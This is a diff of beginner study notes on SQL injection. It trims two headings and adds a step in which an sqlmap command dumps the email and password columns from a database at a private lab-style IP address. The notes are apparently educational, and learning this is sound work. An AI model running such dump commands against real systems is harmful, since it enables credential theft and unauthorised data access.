@@ -1,4 +1,4 @@
-# SQL Injection Basics (Simple Notes)
+# SQL Injection Basics 
 
 ## 1. What is a Database?
 - A **database** is like a digital cupboard where information is stored in an organized way.  
@@ -72,7 +72,7 @@ SELECT * FROM books WHERE title = 'Harry Potter';
 
 ---
 
-# SQL Injection (Explained Simply)
+# SQL Injection 
 
 ## 1. Normal Login Query
 When you log in to a website, it usually sends your details to the database.  
@@ -224,6 +224,12 @@ To test this:
 sqlmap -r intercepted_request.txt
 
 ```
+## 8. Dump data from Database
+Fetching the data of tables (after getting columns like email , password etc.):
+```
+sqlmap -u "http://10.201.57.31/ai/includes/user_login.php?email=test" -D ai -T <table_name> -C email,password --dump
+```
+
 
 # ✅ Summary
 - **SQLMap** = Automated SQL Injection tool.  
